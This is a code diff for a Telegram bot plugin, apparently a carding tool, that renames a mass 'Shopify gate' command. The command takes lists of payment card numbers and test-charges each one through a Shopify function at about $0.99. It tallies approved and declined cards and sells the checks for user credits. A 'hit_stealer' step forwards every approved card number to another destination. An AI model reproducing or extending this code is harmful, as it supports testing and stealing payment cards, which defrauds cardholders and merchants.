@@ -1,13 +1,13 @@
 from pyrogram import Client, filters
 import re, time, asyncio
 from plugins.func.users_sql import *
-from plugins.gates.func.ms_shopify_func import shopify_func
+from plugins.gates.func.mass_shopify_func import shopify_func
 from plugins.tools.hit_stealer import send_hit_if_approved
 from datetime import date
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-@Client.on_message(filters.command("ms", prefixes=["/", "."]))
-async def cmd_ms(Client, message):
+@Client.on_message(filters.command("msh", prefixes=["/", "."]))
+async def cmd_msh(Client, message):
     try:
         user_id = str(message.from_user.id)
         user_name = message.from_user.first_name
@@ -41,19 +41,19 @@ async def cmd_ms(Client, message):
             )
 
         if chat_type in ["ChatType.GROUP", "ChatType.SUPERGROUP"] and str(chat_id) not in GROUP:
-            return await message.reply_text("Unauthorized chat. Contact admin.", message.id)
+            return await message.reply_text("Unauthorized chat.", message.id)
 
         if credit < 1:
             return await message.reply_text("❌ Insufficient credit.", message.id)
 
         if now - antispam_time < wait_time:
-            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)", message.id)
+            return await message.reply_text(f"⏳ AntiSpam: wait {wait_time - (now - antispam_time)}s", message.id)
 
         raw_text = message.reply_to_message.text if message.reply_to_message and message.reply_to_message.text else message.text
         if not raw_text:
             return await message.reply_text("❌ No card input found.", message.id)
 
-        raw = raw_text.replace("/ms", "").strip().split("\n")
+        raw = raw_text.replace("/msh", "").strip().split("\n")
         cards = []
         for x in raw:
             nums = re.findall(r"\d+", x)
@@ -70,7 +70,7 @@ async def cmd_ms(Client, message):
         start_time = time.time()
         stmsg = await message.reply_text("Please wait...⌛", reply_to_message_id=message.id)
 
-        text = "<b>BARRY | M-Shopify 1$</b>\n━━━━━━━━━━━━━\n"
+        text = "<b>BARRY | M-Shopify 0.99$</b>\n━━━━━━━━━━━━━\n"
 
         live, dec, err = 0, 0, 0
 
@@ -101,7 +101,7 @@ async def cmd_ms(Client, message):
             elif "approved" in status.lower():
                 status = "Approved ✅"
                 live += 1
-                await send_hit_if_approved(Client, f"<b>Live Hit (MS)</b>\n<code>{cc}</code>\n<b>Response:</b> {msg}")
+                await send_hit_if_approved(Client, f"<b>Live Hit (MSH)</b>\n<code>{cc}</code>\n<b>Response:</b> {msg}")
             else:
                 status = "Declined ❌"
                 dec += 1
